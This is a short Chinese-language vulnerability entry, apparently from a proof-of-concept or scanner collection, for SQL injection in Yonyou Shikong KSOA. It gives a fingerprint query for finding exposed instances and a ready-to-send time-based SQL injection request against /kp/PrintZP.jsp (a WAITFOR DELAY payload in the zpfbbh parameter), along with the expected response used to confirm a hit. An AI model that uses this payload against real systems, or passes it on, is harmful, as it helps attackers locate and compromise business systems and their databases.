# 用友时空KSOA多处SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-时空KSOA"`
- **请求**：`GET /kp/PrintZP.jsp?zpfbbh=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1`
- **预期**：200　|　响应时间>=5s